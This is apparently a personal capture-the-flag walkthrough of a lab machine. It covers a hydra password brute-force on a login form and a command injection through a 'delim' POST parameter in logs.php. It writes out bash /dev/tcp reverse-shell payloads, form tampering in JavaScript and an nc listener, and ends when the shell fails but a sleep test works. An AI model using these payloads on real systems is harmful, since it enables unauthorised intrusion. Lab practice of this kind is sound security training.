## Info

Can execute these in bash to set variables, which will be used later on in this script.

    ATTACKER=10.10.14.57
    VICTIM=10.10.11.104

## Recon

    bash ../../scripts/discovery/first-scan.sh $VICTIM > recon.txt

Looks like port 22 and 80 are open.

### Port 80

There's a login page, you can `POST http://10.10.11.104/login.php username=asdf&password=ASDF`.

Probably try cred stuffing?

#### Subdir scan

    bash ../../scripts/discovery/subdirectory-scan.sh $VICTIM

#### Cred stuffing

    hydra -l admin -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
    
Apparently it worked. `admin:asdfasdf`. Wow!

## Next steps

We have access to the admin interface. Looks like there's a few other users, a way to upload files, and a way to view who downloaded files.

### Downloaded PHP

Some more goodies exist in the code, like hardcoded secrets, but I don't care enough to review them. Command injection may be enough.

-   .`/downloaded-files/siteBackup/logs.php` line 19, command injection
    -   ```php
        $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
        ```

This is all we need to get a shell.

## Reverse shell via command injection

Run this bash command to generate a payload.

This payload is to be sent via HTTP POST into the 'delim' parameter, at this page: `/file_logs.php`

    echo "comma; bash -i >& /dev/tcp/$ATTACKER/6969 0>&1"

e.g:

    comma; bash -i >& /dev/tcp/10.10.14.57/6969 0>&1

Then, run this in JavaScript to modify the form (change IP if needed):

    $('option').value = "comma && bash -i >& /dev/tcp/10.10.14.57/6969 0>&1"
    $('option').innerHTML = "payload ;)"

Then, run this on the attacker machine to listen for connections:

    nc -lvp 6969

And submit the form.

And the reverse shell doesn't work. Fuck.

Does the command injection work at all?

Try:

    $('option').value = "comma && sleep 20"
    $('option').innerHTML = "payload ;)"

Sleep works... So the command injection works. Perhaps we just can't make a connection back to the attacker.